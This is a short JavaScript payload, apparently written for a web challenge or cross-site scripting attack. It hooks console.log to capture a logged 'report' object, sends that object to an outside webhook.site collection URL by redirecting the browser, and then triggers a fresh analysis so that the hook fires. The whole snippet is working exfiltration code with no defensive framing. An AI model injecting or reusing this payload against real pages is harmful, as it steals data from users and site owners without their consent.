// The report was already logged, but we can override console to catch future logs
const oldLog = console.log;
console.log = function(...args) {
    if (args[0] === "Ignoring report" && args[1]) {
        // Found the report object!
        window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?report=' + encodeURIComponent(JSON.stringify(args[1]));
    }
    return oldLog.apply(console, args);
};

// Trigger another analysis
setTimeout(function() {
    analyzeUrl('https://google.com');
}, 500);